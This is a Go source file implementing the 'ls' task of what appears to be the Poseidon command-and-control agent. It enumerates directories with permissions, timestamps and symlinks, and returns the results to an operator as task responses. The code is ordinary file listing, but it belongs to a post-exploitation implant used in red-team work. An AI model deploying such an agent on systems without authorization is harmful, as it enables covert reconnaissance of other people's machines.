package ls

import (
	// Standard
	"encoding/json"
	"os"
	"path/filepath"
	"strings"

	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/functions"

	// 3rd Party
	"github.com/djherbis/atime"

	// Poseidon

	"github.com/jparr721/poseidon-afm/poseidon/agent_code/pkg/utils/structs"
)

func ProcessPath(path string) (*structs.FileBrowser, error) {
	var e structs.FileBrowser
	e.SetAsUserOutput = true
	e.Files = make([]structs.FileData, 0)
	fixedPath := path
	if strings.HasPrefix(fixedPath, "~/") {
		dirname, _ := os.UserHomeDir()
		fixedPath = filepath.Join(dirname, fixedPath[2:])
	}
	abspath, _ := filepath.Abs(fixedPath)
	//abspath, _ = filepath.EvalSymlinks(abspath)
	dirInfo, err := os.Stat(abspath)
	filepath.EvalSymlinks(abspath)
	if err != nil {
		return &e, err
	}
	e.IsFile = !dirInfo.IsDir()
	e.Permissions = GetPermission(dirInfo)
	symlinkPath, _ := filepath.EvalSymlinks(abspath)
	if symlinkPath != abspath {
		e.Permissions.Symlink = symlinkPath
	}
	e.Filename = dirInfo.Name()
	e.ParentPath = filepath.Dir(abspath)
	if strings.Compare(e.ParentPath, e.Filename) == 0 {
		e.ParentPath = ""
	}
	e.FileSize = dirInfo.Size()
	e.LastModified = dirInfo.ModTime().Unix() * 1000
	at, err := atime.Stat(abspath)
	if err != nil {
		e.LastAccess = 0
	} else {
		e.LastAccess = at.Unix() * 1000
	}
	e.Success = true
	e.UpdateDeleted = true
	if dirInfo.IsDir() {
		files, err := os.ReadDir(abspath)
		if err != nil {
			e.Success = false
			e.UpdateDeleted = false
			return &e, err
		}
		fileEntries := make([]structs.FileData, len(files))
		for i := 0; i < len(files); i++ {
			fileEntries[i].IsFile = !files[i].IsDir()
			fileInfo, err := files[i].Info()
			if err != nil {
				fileEntries[i].Permissions = structs.FilePermission{}
				fileEntries[i].FileSize = 0
				fileEntries[i].LastModified = 0
			} else {
				fileEntries[i].Permissions = GetPermission(fileInfo)
				fileEntries[i].FileSize = fileInfo.Size()
				fileEntries[i].LastModified = fileInfo.ModTime().Unix() * 1000
			}
			fileEntries[i].Name = files[i].Name()
			fileEntries[i].FullName = filepath.Join(abspath, files[i].Name())
			symlinkPath, _ = filepath.EvalSymlinks(fileEntries[i].FullName)
			if symlinkPath != fileEntries[i].FullName {
				fileEntries[i].Permissions.Symlink = symlinkPath
			}
			at, err = atime.Stat(fileEntries[i].FullName)
			if err != nil {
				fileEntries[i].LastAccess = 0
			} else {
				fileEntries[i].LastAccess = at.Unix() * 1000
			}
		}
		e.Files = fileEntries
	} else {
		fileEntries := make([]structs.FileData, 0)
		e.Files = fileEntries
		e.UpdateDeleted = false
	}
	return &e, nil
}
func Run(task structs.Task) {
	args := structs.FileBrowserArguments{}
	err := json.Unmarshal([]byte(task.Params), &args)
	if err != nil {
		msg := task.NewResponse()
		msg.SetError(err.Error())
		task.Job.SendResponses <- msg
		return
	}
	if args.Depth == 0 {
		args.Depth = 1
	}
	if args.Host != "" {
		if strings.ToLower(args.Host) != strings.ToLower(functions.GetHostname()) {
			if args.Host != "127.0.0.1" && args.Host != "localhost" {
				msg := task.NewResponse()
				msg.SetError("can't currently list files on remote hosts")
				task.Job.SendResponses <- msg
				return
			}
		}
	}
	var paths = []string{args.Path}
	for args.Depth >= 1 {
		nextPaths := []string{}
		for _, path := range paths {
			msg := task.NewResponse()
			fb, err := ProcessPath(path)
			if err != nil {
				msg.SetError(err.Error())
			}
			msg.FileBrowser = fb
			task.Job.SendResponses <- msg
			if fb == nil {
				continue
			}
			for _, child := range fb.Files {
				if !child.IsFile {
					nextPaths = append(nextPaths, child.FullName)
				}
			}
		}
		paths = nextPaths
		args.Depth--
	}
	msg := task.NewResponse()
	msg.Completed = true
	task.Job.SendResponses <- msg
	return
}
